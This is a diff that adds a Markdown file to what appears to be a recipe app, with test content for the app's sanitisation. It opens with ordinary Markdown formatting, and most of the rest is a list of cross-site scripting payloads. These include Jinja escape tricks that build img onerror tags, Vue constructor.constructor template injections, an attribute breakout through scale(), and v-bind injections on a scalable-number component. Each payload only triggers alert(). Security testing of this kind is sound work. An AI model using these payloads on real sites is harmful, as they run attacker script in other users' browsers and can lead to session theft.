@@ -1,0 +1,82 @@
+- unordered
+- list
+- test
+
+1. ordered
+2. list
+3. test
+
+**Bold**
+*Italics*
+
+# Header 1
+
+## Header 2
+
+### Header 3
+
+#### Header 4
+
+##### Header 5
+
+###### Header 6
+
+[Google](https://www.google.com)
+
+> Quote
+
+{{ scale(100) }} 
+
+{{ ingredients[1] }}
+
+Various direct injections of script trough jinja
+
+{{ "\x3cimg src=x onerror=alert(document.domain)\x3e" }}
+
+{{ "%cimg src=x onerror=alert(document.domain)%c"|format(60,62) }}
+
+{{ "\u003cimg src=x onerror=alert(document.domain)\u003e" }}
+
+{{ "%cimg src=x onerror=alert(document.domain)%c" % (60,62) }}
+
+{{ "&lt;img src=x onerror=alert(4)&gt;"|replace("&lt;","%c"|format(60))|replace("&gt;","%c"|format(62)) }}
+
+{% raw %}{{ "".constructor.constructor("alert(document.domain)")() }}{% endraw %}
+
+Various other injections trough Jinja
+
+1. %c with |format filter:
+{{ "%cimg src=x onerror=alert(1)%c"|format(60,62) }}
+
+ 2. vue template injection
+{% raw %}{{ (1).constructor.constructor("alert(2)")() }}{% endraw %}
+
+3. \x hex escape:
+{{ "\x3cimg src=x onerror=alert(3)\x3e" }}
+
+4. \u unicode escape:
+{{ "\u003cimg src=x onerror=alert(4)\u003e" }}
+
+5. % operator:
+{{ "%cimg src=x onerror=alert(5)%c" % (60,62) }}
+
+6. replace chain
+{{ "&lt;img src=x onerror=alert(6)&gt;"|replace("&lt;","%c"|format(60))|replace("&gt;","%c"|format(62)) }}
+
+7. scale() attribute breakout (hover to trigger):
+{{ scale("1' onmouseover=alert(7) x='") }}
+
+Various injections trough scalable number
+
+<scalable-number v-bind:number="''.constructor.constructor('alert(1)')()"></scalable-number>
+<scalable-number v-bind:number="(0).constructor.constructor('alert(2)')()"></scalable-number>
+<scalable-number v-bind:number="/x/.constructor.constructor('alert(3)')()"></scalable-number>
+<scalable-number v-bind:number="true.constructor.constructor('alert(4)')()"></scalable-number>
+<scalable-number v-bind:number="[].constructor.constructor('alert(5)')()"></scalable-number>
+<scalable-number v-bind:number="''.constructor.constructor('alert(6);return 1')()"></scalable-number>
+<scalable-number v-bind:number="''.constructor.constructor('alert(7)')()"></scalable-number>
+<scalable-number v-bind:number="''.constructor.constructor('alert(8)')()"	v-bind:factor='1'></scalable-number>
+<scalable-number v-bind:number="&#39;&#39;.constructor.constructor(&#39;alert(9)&#39;)()"></scalable-number>
+{{ "\x3cscalable-number v-bind:number=\x221\x22 v-bind:factor=\x22''.constructor.constructor('alert(10)')()\x22\x3e\x3c/scalable-number\x3e" }}
+{{ "\x3cscalable-number v-bind:number=\x22''.constructor.constructor('alert(11)')()\x22\x3e\x3c/scalable-number\x3e" }}
+<scalable-number v-bind:number='1+1' v-bind:factor='1'></scalable-number>
